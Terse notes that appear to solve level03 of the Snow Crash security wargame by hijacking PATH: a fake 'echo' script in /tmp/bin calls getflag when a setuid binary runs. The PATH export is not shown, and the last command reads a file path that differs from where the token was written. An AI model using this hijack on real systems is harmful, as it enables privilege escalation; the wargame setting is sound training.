CMD: 
    scp -P 4246 level03@localhost:~/level03 42/snow-crash ex03/ressources/.
STEP:
    https://dogbolt.org/?id=0a105cdf-9237-4e31-9773-e9a12740c81a#Ghidra=151

CMD:
    mkdir -p /tmp/bin;
    find / -name "getflag" 2> /dev/null;
    echo -e "/bin/getflag > /tmp/token_lvl03" > /tmp/bin/echo;
    chmod +x /tmp/bin/echo;
    ./level03;
    cat /tmp/bin/token_lvl03;